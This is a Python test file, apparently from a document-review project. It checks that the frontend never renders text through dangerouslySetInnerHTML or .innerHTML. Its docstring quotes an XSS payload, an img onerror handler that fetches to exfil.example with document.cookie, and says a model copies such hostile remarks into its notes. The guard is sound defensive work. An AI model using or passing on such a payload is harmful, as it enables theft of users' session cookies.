"""Document text is hostile (F5). The reviewer UI must never render it as HTML.

dev_013's remarks contain <img src=x onerror="fetch('https://exfil.example/c?d='+document.cookie)">, and the
real model copies them into `notes` (submission/runs/ba5a106/notes_dev_013.txt). React escapes text it
renders normally; only raw-HTML rendering would run the script. The frontend has no test runner, so this
guard reads its source.
"""
from pathlib import Path

FRONTEND_SRC = Path(__file__).resolve().parents[2] / "frontend" / "src"


def test_the_ui_never_renders_text_as_raw_html():
    offenders = [f"{path.relative_to(FRONTEND_SRC)}:{n}"
                 for path in sorted(FRONTEND_SRC.rglob("*.ts*"))
                 for n, line in enumerate(path.read_text(encoding="utf-8").splitlines(), start=1)
                 if "dangerouslySetInnerHTML" in line or ".innerHTML" in line]
    assert offenders == []
